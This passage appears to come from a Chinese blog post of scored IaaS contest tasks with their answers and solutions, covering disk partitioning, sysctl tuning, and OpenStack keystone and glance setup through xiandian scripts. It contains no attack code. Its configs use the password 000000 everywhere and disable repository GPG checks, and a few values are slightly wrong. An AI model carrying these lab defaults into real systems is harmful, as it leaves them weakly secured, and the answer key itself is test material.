<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@compute ~]# <span class="built_in">mkdir</span> /home/yum</span><br><span class="line">[root@compute ~]# <span class="built_in">mv</span> /etc/yum.repos.d/* /home/yum</span><br><span class="line">[root@compute ~]# <span class="built_in">cat</span> /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://controller/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=iaas</span><br><span class="line">baseurl=ftp://controller/iaas/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[root@compute ~]# yum repolist</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-分区"><a href="#7-分区" class="headerlink" title="7.分区"></a>7.分区</h3><p>在 compute 节点将 vdb 分为两个区分别为 vdb1 和 vdb2,大小自定义。要求分区格式为 gpt,</p>
<p>使用 mkfs.xfs 命令对文件系统格式化。</p>
<p>请将 lsblk -f 命令的返回结果提交到答题框【1 分】</p>
<p><code>虚拟机没有vdb区,使用sdb分区进行代替</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@compute ~]# lsblk -f</span><br><span class="line">NAME            FSTYPE      LABEL           UUID                                   MOUNTPOINT</span><br><span class="line">sda</span><br><span class="line">├─sda1          xfs                         c2b0cad1-cdef-48c6-adb7-5e4eafaf7458   /boot</span><br><span class="line">└─sda2          LVM2_member                 oiioJ7-K5mu-sPhw-R4Rb-S3yH-fWo9-23G9aY</span><br><span class="line">  ├─centos-root xfs                         e78104be-5c62-4102-b730-f03cde9fa24a   /</span><br><span class="line">  └─centos-swap swap                        74991746-7fc7-4936-a835-4f603f2468c8   [SWAP]</span><br><span class="line">sdb</span><br><span class="line">├─sdb1          xfs                         25a1594a-769d-48ac-966c-d59607cd0bb4</span><br><span class="line">└─sdb2          xfs                         c49808f0-0ac0-4848-957d-e0525f1117b3</span><br><span class="line">sdc</span><br><span class="line">sr0             iso9660     CentOS 7 x86_64 2018-05-03-20-55-23-00</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@compute ~]# yum install -y gdisk</span><br><span class="line">[root@compute ~]# gdisk /dev/sdb</span><br><span class="line">GPT fdisk (gdisk) version 0.8.10</span><br><span class="line"></span><br><span class="line">Partition table scan:</span><br><span class="line">  MBR: not present</span><br><span class="line">  BSD: not present</span><br><span class="line">  APM: not present</span><br><span class="line">  GPT: not present</span><br><span class="line"></span><br><span class="line">Creating new GPT entries.</span><br><span class="line"></span><br><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition number (1-128, default 1):</span><br><span class="line">First sector (34-41943006, default = 2048) or &#123;+-&#125;size&#123;KMGTP&#125;:</span><br><span class="line">Last sector (2048-41943006, default = 41943006) or &#123;+-&#125;size&#123;KMGTP&#125;: +10G</span><br><span class="line">Current <span class="built_in">type</span> is <span class="string">&#x27;Linux filesystem&#x27;</span></span><br><span class="line">Hex code or GUID (L to show codes, Enter = 8300):</span><br><span class="line">Changed <span class="built_in">type</span> of partition to <span class="string">&#x27;Linux filesystem&#x27;</span></span><br><span class="line"></span><br><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition number (2-128, default 2):</span><br><span class="line">First sector (34-41943006, default = 20973568) or &#123;+-&#125;size&#123;KMGTP&#125;:</span><br><span class="line">Last sector (20973568-41943006, default = 41943006) or &#123;+-&#125;size&#123;KMGTP&#125;: +10G</span><br><span class="line">Last sector (20973568-41943006, default = 41943006) or &#123;+-&#125;size&#123;KMGTP&#125;:</span><br><span class="line">Current <span class="built_in">type</span> is <span class="string">&#x27;Linux filesystem&#x27;</span></span><br><span class="line">Hex code or GUID (L to show codes, Enter = 8300):</span><br><span class="line">Changed <span class="built_in">type</span> of partition to <span class="string">&#x27;Linux filesystem&#x27;</span></span><br><span class="line"></span><br><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>): w</span><br><span class="line"></span><br><span class="line">Final checks complete. About to write GPT data. THIS WILL OVERWRITE EXISTING</span><br><span class="line">PARTITIONS!!</span><br><span class="line"></span><br><span class="line">Do you want to proceed? (Y/N): y</span><br><span class="line">OK; writing new GUID partition table (GPT) to /dev/sdb.</span><br><span class="line">The operation has completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@compute ~]# mkfs.xfs /dev/sdb1</span><br><span class="line">[root@compute ~]# mkfs.xfs /dev/sdb2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="8-系统调优-脏数据回写"><a href="#8-系统调优-脏数据回写" class="headerlink" title="8.系统调优-脏数据回写"></a>8.系统调优-脏数据回写</h3><p>Linux 系统内存中会存在脏数据，一般系统默认脏数据占用内存 30%时会回写磁盘，修</p>
<p>改系统配置文件，要求将回写磁盘的大小调整为 60%。</p>
<p>在 controller 节点请将 sysctl -p 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# sysctl -p</span><br><span class="line">vm.dirty_ratio = 60</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/sysctl.conf</span><br><span class="line">vm.dirty_ratio = 60</span><br></pre></td></tr></table></figure>

<h2 id="任务-2-OpenStack-搭建任务（8-分）"><a href="#任务-2-OpenStack-搭建任务（8-分）" class="headerlink" title="任务 2 OpenStack 搭建任务（8 分）"></a>任务 2 OpenStack 搭建任务（8 分）</h2><h3 id="1-修改脚本文件"><a href="#1-修改脚本文件" class="headerlink" title="1.修改脚本文件"></a>1.修改脚本文件</h3><p>在 controller 节点和 compute 节点分别安装 iaas-xiandian 软件包，修改脚本文件基本变</p>
<p>量（脚本文件为&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh），修改完成后使用命令生效该脚本文件。</p>
<p>在 controller 节点请将 echo $INTERFACE_NAME 命令的返回结果提交到答题框。【0.5 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">echo</span> <span class="variable">$INTERFACE_NAME</span></span><br><span class="line">eth36</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#controller节点与compute节点做法相同</span></span><br><span class="line"><span class="comment">#只修改interface_ip和INTERFACE_NAME  即可</span></span><br><span class="line"></span><br><span class="line">[root@controller ~]# yum install -y iaas-xiandian</span><br><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/xiandian/openrc.sh</span><br><span class="line"><span class="comment">#--------------------system Config--------------------##</span></span><br><span class="line"><span class="comment">#Controller Server Manager IP. example:x.x.x.x</span></span><br><span class="line">HOST_IP=192.168.157.30</span><br><span class="line"></span><br><span class="line"><span class="comment">#Controller HOST Password. example:000000</span></span><br><span class="line">HOST_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Controller Server hostname. example:controller</span></span><br><span class="line">HOST_NAME=controller</span><br><span class="line"></span><br><span class="line"><span class="comment">#Compute Node Manager IP. example:x.x.x.x</span></span><br><span class="line">HOST_IP_NODE=192.168.157.31</span><br><span class="line"></span><br><span class="line"><span class="comment">#Compute HOST Password. example:000000</span></span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Compute Node hostname. example:compute</span></span><br><span class="line">HOST_NAME_NODE=compute</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Chrony Config-------------------##</span></span><br><span class="line"><span class="comment">#Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)</span></span><br><span class="line">network_segment_IP=192.168.157,0/24</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Rabbit Config ------------------##</span></span><br><span class="line"><span class="comment">#user for rabbit. example:openstack</span></span><br><span class="line">RABBIT_USER=openstack</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for rabbit user .example:000000</span></span><br><span class="line">RABBIT_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------MySQL Config---------------------##</span></span><br><span class="line"><span class="comment">#Password for MySQL root user . exmaple:000000</span></span><br><span class="line">DB_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Keystone Config------------------##</span></span><br><span class="line"><span class="comment">#Password for Keystore admin user. exmaple:000000</span></span><br><span class="line">DOMAIN_NAME=demo</span><br><span class="line">ADMIN_PASS=000000</span><br><span class="line">DEMO_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Mysql keystore user. exmaple:000000</span></span><br><span class="line">KEYSTONE_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Glance Config--------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql glance user. exmaple:000000</span></span><br><span class="line">GLANCE_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore glance user. exmaple:000000</span></span><br><span class="line">GLANCE_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Nova Config----------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql nova user. exmaple:000000</span></span><br><span class="line">NOVA_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore nova user. exmaple:000000</span></span><br><span class="line">NOVA_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Neturon Config-------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql neutron user. exmaple:000000</span></span><br><span class="line">NEUTRON_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore neutron user. exmaple:000000</span></span><br><span class="line">NEUTRON_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#metadata secret for neutron. exmaple:000000</span></span><br><span class="line">METADATA_SECRET=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Tunnel Network Interface. example:x.x.x.x</span></span><br><span class="line">INTERFACE_IP=192.168.157.30</span><br><span class="line"></span><br><span class="line"><span class="comment">#External Network Interface. example:eth1</span></span><br><span class="line">INTERFACE_NAME=eth36</span><br><span class="line"></span><br><span class="line"><span class="comment">#External Network The Physical Adapter. example:provider</span></span><br><span class="line">Physical_NAME=provider</span><br><span class="line"></span><br><span class="line"><span class="comment">#First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101</span></span><br><span class="line">minvlan=101</span><br><span class="line"></span><br><span class="line"><span class="comment">#Last Vlan ID in VLAN RANGE for VLAN Network. example:200</span></span><br><span class="line">maxvlan=200</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Cinder Config--------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql cinder user. exmaple:000000</span></span><br><span class="line">CINDER_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore cinder user. exmaple:000000</span></span><br><span class="line">CINDER_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Cinder Block Disk. example:md126p3</span></span><br><span class="line">BLOCK_DISK=sdb1</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Swift Config---------------------##</span></span><br><span class="line"><span class="comment">#Password for Keystore swift user. exmaple:000000</span></span><br><span class="line">SWIFT_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#The NODE Object Disk for Swift. example:md126p4.</span></span><br><span class="line">OBJECT_DISK=sdb2</span><br><span class="line"></span><br><span class="line"><span class="comment">#The NODE IP for Swift Storage Network. example:x.x.x.x.</span></span><br><span class="line">STORAGE_LOCAL_NET_IP=192.168.157.31</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Heat Config----------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql heat user. exmaple:000000</span></span><br><span class="line">HEAT_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore heat user. exmaple:000000</span></span><br><span class="line">HEAT_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Zun Config-----------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql Zun user. exmaple:000000</span></span><br><span class="line">ZUN_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore Zun user. exmaple:000000</span></span><br><span class="line">ZUN_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Mysql Kuryr user. exmaple:000000</span></span><br><span class="line">KURYR_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore Kuryr user. exmaple:000000</span></span><br><span class="line">KURYR_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Ceilometer Config----------------##</span></span><br><span class="line"><span class="comment">#Password for Gnocchi ceilometer user. exmaple:000000</span></span><br><span class="line">CEILOMETER_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore ceilometer user. exmaple:000000</span></span><br><span class="line">CEILOMETER_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------AODH Config----------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql AODH user. exmaple:000000</span></span><br><span class="line">AODH_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore AODH user. exmaple:000000</span></span><br><span class="line">AODH_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Barbican Config----------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql Barbican user. exmaple:000000</span></span><br><span class="line">BARBICAN_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore Barbican user. exmaple:000000</span></span><br><span class="line">BARBICAN_PASS=000000</span><br><span class="line"></span><br><span class="line">root@controller ~]# <span class="built_in">source</span> /etc/xiandian/openrc.sh</span><br></pre></td></tr></table></figure>

<h3 id="2-修改脚本文件"><a href="#2-修改脚本文件" class="headerlink" title="2.修改脚本文件"></a>2.修改脚本文件</h3><p>在 compute 节点配置&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh 文件，根据环境情况修改参数，块存储服务</p>
<p>的后端使用第二块硬盘的第一个分区，生效该参数文件。</p>
<p>请将 echo $INTERFACE_IP&amp;&amp; echo $BLOCK_DISK 命令的返回结果提交到答题框。【0.5 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@compute ~]#  <span class="built_in">echo</span> <span class="variable">$INTERFACE_IP</span>&amp;&amp; <span class="built_in">echo</span> <span class="variable">$BLOCK_DISK</span></span><br><span class="line">192.168.157.31</span><br><span class="line">sdb1</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@compute ~]# <span class="built_in">cat</span> /etc/xiandian/openrc.sh</span><br><span class="line"><span class="comment">#--------------------system Config--------------------##</span></span><br><span class="line"><span class="comment">#Controller Server Manager IP. example:x.x.x.x</span></span><br><span class="line">HOST_IP=192.168.157.30</span><br><span class="line"></span><br><span class="line"><span class="comment">#Controller HOST Password. example:000000</span></span><br><span class="line">HOST_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Controller Server hostname. example:controller</span></span><br><span class="line">HOST_NAME=controller</span><br><span class="line"></span><br><span class="line"><span class="comment">#Compute Node Manager IP. example:x.x.x.x</span></span><br><span class="line">HOST_IP_NODE=192.168.157.31</span><br><span class="line"></span><br><span class="line"><span class="comment">#Compute HOST Password. example:000000</span></span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Compute Node hostname. example:compute</span></span><br><span class="line">HOST_NAME_NODE=compute</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Chrony Config-------------------##</span></span><br><span class="line"><span class="comment">#Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)</span></span><br><span class="line">network_segment_IP=192.168.157,0/24</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Rabbit Config ------------------##</span></span><br><span class="line"><span class="comment">#user for rabbit. example:openstack</span></span><br><span class="line">RABBIT_USER=openstack</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for rabbit user .example:000000</span></span><br><span class="line">RABBIT_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------MySQL Config---------------------##</span></span><br><span class="line"><span class="comment">#Password for MySQL root user . exmaple:000000</span></span><br><span class="line">DB_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Keystone Config------------------##</span></span><br><span class="line"><span class="comment">#Password for Keystore admin user. exmaple:000000</span></span><br><span class="line">DOMAIN_NAME=demo</span><br><span class="line">ADMIN_PASS=000000</span><br><span class="line">DEMO_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Mysql keystore user. exmaple:000000</span></span><br><span class="line">KEYSTONE_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Glance Config--------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql glance user. exmaple:000000</span></span><br><span class="line">GLANCE_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore glance user. exmaple:000000</span></span><br><span class="line">GLANCE_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Nova Config----------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql nova user. exmaple:000000</span></span><br><span class="line">NOVA_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore nova user. exmaple:000000</span></span><br><span class="line">NOVA_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Neturon Config-------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql neutron user. exmaple:000000</span></span><br><span class="line">NEUTRON_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore neutron user. exmaple:000000</span></span><br><span class="line">NEUTRON_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#metadata secret for neutron. exmaple:000000</span></span><br><span class="line">METADATA_SECRET=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Tunnel Network Interface. example:x.x.x.x</span></span><br><span class="line">INTERFACE_IP=192.168.157.31</span><br><span class="line"></span><br><span class="line"><span class="comment">#External Network Interface. example:eth1</span></span><br><span class="line">INTERFACE_NAME=eth37</span><br><span class="line"></span><br><span class="line"><span class="comment">#External Network The Physical Adapter. example:provider</span></span><br><span class="line">Physical_NAME=provider</span><br><span class="line"></span><br><span class="line"><span class="comment">#First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101</span></span><br><span class="line">minvlan=101</span><br><span class="line"></span><br><span class="line"><span class="comment">#Last Vlan ID in VLAN RANGE for VLAN Network. example:200</span></span><br><span class="line">maxvlan=200</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Cinder Config--------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql cinder user. exmaple:000000</span></span><br><span class="line">CINDER_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore cinder user. exmaple:000000</span></span><br><span class="line">CINDER_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Cinder Block Disk. example:md126p3</span></span><br><span class="line">BLOCK_DISK=sdb1</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Swift Config---------------------##</span></span><br><span class="line"><span class="comment">#Password for Keystore swift user. exmaple:000000</span></span><br><span class="line">SWIFT_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#The NODE Object Disk for Swift. example:md126p4.</span></span><br><span class="line">OBJECT_DISK=sdb2</span><br><span class="line"></span><br><span class="line"><span class="comment">#The NODE IP for Swift Storage Network. example:x.x.x.x.</span></span><br><span class="line">STORAGE_LOCAL_NET_IP=192.168.157.31</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Heat Config----------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql heat user. exmaple:000000</span></span><br><span class="line">HEAT_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore heat user. exmaple:000000</span></span><br><span class="line">HEAT_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Zun Config-----------------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql Zun user. exmaple:000000</span></span><br><span class="line">ZUN_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore Zun user. exmaple:000000</span></span><br><span class="line">ZUN_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Mysql Kuryr user. exmaple:000000</span></span><br><span class="line">KURYR_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore Kuryr user. exmaple:000000</span></span><br><span class="line">KURYR_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Ceilometer Config----------------##</span></span><br><span class="line"><span class="comment">#Password for Gnocchi ceilometer user. exmaple:000000</span></span><br><span class="line">CEILOMETER_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore ceilometer user. exmaple:000000</span></span><br><span class="line">CEILOMETER_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------AODH Config----------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql AODH user. exmaple:000000</span></span><br><span class="line">AODH_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore AODH user. exmaple:000000</span></span><br><span class="line">AODH_PASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------Barbican Config----------------##</span></span><br><span class="line"><span class="comment">#Password for Mysql Barbican user. exmaple:000000</span></span><br><span class="line">BARBICAN_DBPASS=000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#Password for Keystore Barbican user. exmaple:000000</span></span><br><span class="line">BARBICAN_PASS=000000</span><br><span class="line"></span><br><span class="line">[root@compute ~]# <span class="built_in">source</span> /etc/xiandian/openrc.sh</span><br></pre></td></tr></table></figure>

<h3 id="3-安装-openstack-包"><a href="#3-安装-openstack-包" class="headerlink" title="3.安装 openstack 包"></a>3.安装 openstack 包</h3><p>分别在 controller 节点和 compute 节点执行 iaas-pre-host.sh 文件(不需要重启云主机)。</p>
<p>在 controller 节点请将 openstack –version 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack --version</span><br><span class="line">openstack 3.14.3</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-pre-host.sh</span><br><span class="line">[root@compute ~]# iaas-pre-host.sh</span><br></pre></td></tr></table></figure>

<h3 id="4-搭建数据库组件"><a href="#4-搭建数据库组件" class="headerlink" title="4. 搭建数据库组件"></a>4. 搭建数据库组件</h3><p>在 controller 节点执行 iaas-install-mysql.sh 脚本，会自行安装 mariadb、memcached、</p>
<p>rabbitmq 等服务和完成相关配置。执行完成后修改配置文件将缓存 CACHESIZE 修改为 128,</p>
<p>并重启相应服务。</p>
<p>请将 ps aux|grep memcached 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# ps aux|grep memcached</span><br><span class="line">memcach+  15901  0.1  0.0 443040  2164 ?        Ssl  09:15   0:00 /usr/bin/memcached -p 11211 -u memcached -m 128 -c 1024 -l 127.0.0.1,::1,controller</span><br><span class="line">root      15919  0.0  0.0 112704   960 pts/0    S+   09:15   0:00 grep --color=auto memcached</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-mysql.sh</span><br><span class="line">[root@controller ~]# rpm -qc memcached</span><br><span class="line">/etc/sysconfig/memcached</span><br><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/sysconfig/memcached</span><br><span class="line">PORT=<span class="string">&quot;11211&quot;</span></span><br><span class="line">USER=<span class="string">&quot;memcached&quot;</span></span><br><span class="line">MAXCONN=<span class="string">&quot;1024&quot;</span></span><br><span class="line">CACHESIZE=<span class="string">&quot;128&quot;</span></span><br><span class="line">OPTIONS=<span class="string">&quot;-l 127.0.0.1,::1,controller&quot;</span></span><br><span class="line">[root@controller ~]# systemctl restart memcached</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-搭建认证服务组件"><a href="#5-搭建认证服务组件" class="headerlink" title="5.搭建认证服务组件"></a>5.搭建认证服务组件</h3><p>在 controller 节点执行 iaas-install-keystone.sh 脚本，会自行安装 keystone 服务和完成相</p>
<p>关配置。使用 openstack 命令，创建一个名为 tom 的账户，密码为 tompassword123,邮箱为</p>
<p><a href="mailto:&#x74;&#x6f;&#x6d;&#64;&#101;&#x78;&#97;&#x6d;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#x6d;">&#x74;&#x6f;&#x6d;&#64;&#101;&#x78;&#97;&#x6d;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#x6d;</a>。</p>
<p>请将 openstack user list 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack user list</span><br><span class="line">+----------------------------------+-------+</span><br><span class="line">| ID                               | Name  |</span><br><span class="line">+----------------------------------+-------+</span><br><span class="line">| 0a22a2d4f3964cfbbbd6474dc92cca01 | admin |</span><br><span class="line">| 196d426492be403b8fbaa4b0c0f8e2a9 | tom   |</span><br><span class="line">| 314971684b4d4345b5aa43b2dd55339f | demo  |</span><br><span class="line">+----------------------------------+-------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-keystone.sh</span><br><span class="line">[root@controller ~]# <span class="built_in">source</span> /etc/keystone/admin-openrc.sh</span><br><span class="line">[root@controller ~]# openstack user create tom --password tompassword123 --email tom@example.com --domain demo</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| Field               | Value                            |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| domain_id           | ed6f7dc2006d4010bd9194ebc576d9e9 |</span><br><span class="line">| email               | tom@example.com                  |</span><br><span class="line">| enabled             | True                             |</span><br><span class="line">| <span class="built_in">id</span>                  | 196d426492be403b8fbaa4b0c0f8e2a9 |</span><br><span class="line">| name                | tom                              |</span><br><span class="line">| options             | &#123;&#125;                               |</span><br><span class="line">| password_expires_at | None                             |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-搭建镜像服务组件"><a href="#6-搭建镜像服务组件" class="headerlink" title="6.搭建镜像服务组件"></a>6.搭建镜像服务组件</h3><p>在 controller 节点执行 iaas-install-glance.sh 脚本，会自行安装 glance 服务和完成相关</p>
<p>配 置 。 完 成 后 使 用 openstack 命 令 , 创 建 一 个 名 为 cirros 的 镜 像 ， 镜 像 文 件 使 用</p>
<p>cirros-0.3.4-x86_64-disk.img。</p>
<p>请将 openstack image show cirros 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]#  openstack image show cirros</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| Field            | Value                                                |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| checksum         | 443b7623e27ecf03dc9e01ee93f67afe                     |</span><br><span class="line">| container_format | bare                                                 |</span><br><span class="line">| created_at       | 2023-03-13T13:29:50Z                                 |</span><br><span class="line">| disk_format      | qcow2                                                |</span><br><span class="line">| file             | /v2/images/4219d1cb-5238-4720-a7be-167f9b158a9b/file |</span><br><span class="line">| <span class="built_in">id</span>               | 4219d1cb-5238-4720-a7be-167f9b158a9b                 |</span><br><span class="line">| min_disk         | 0                                                    |</span><br><span class="line">| min_ram          | 0                                                    |</span><br><span class="line">| name             | cirros                                               |</span><br><span class="line">| owner            | 1a99aaa6a1024d84a00a779c4d186b44                     |</span><br><span class="line">| protected        | False                                                |</span><br><span class="line">| schema           | /v2/schemas/image                                    |</span><br><span class="line">| size             | 12716032                                             |</span><br><span class="line">| status           | active                                               |</span><br><span class="line">| tags             |                                                      |</span><br><span class="line">| updated_at       | 2023-03-13T13:29:50Z                                 |</span><br><span class="line">| virtual_size     | None                                                 |</span><br><span class="line">| visibility       | shared                                               |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-glance.sh</span><br><span class="line">[root@controller ~]# openstack image create --disk-format qcow2 --container bare --file /root/cirros-0.4.0-x86_64-disk.img  cirros</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| Field            | Value                                                |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| checksum         | 443b7623e27ecf03dc9e01ee93f67afe                     |</span><br><span class="line">| container_format | bare                                                 |</span><br><span class="line">| created_at       | 2023-03-13T13:29:50Z                                 |</span><br><span class="line">| disk_format      | qcow2                                                |</span><br><span class="line">| file             | /v2/images/4219d1cb-5238-4720-a7be-167f9b158a9b/file |</span><br><span class="line">| <span class="built_in">id</span>               | 4219d1cb-5238-4720-a7be-167f9b158a9b                 |</span><br><span class="line">| min_disk         | 0                                                    |</span><br><span class="line">| min_ram          | 0                                                    |</span><br><span class="line">| name             | cirros                                               |</span><br><span class="line">| 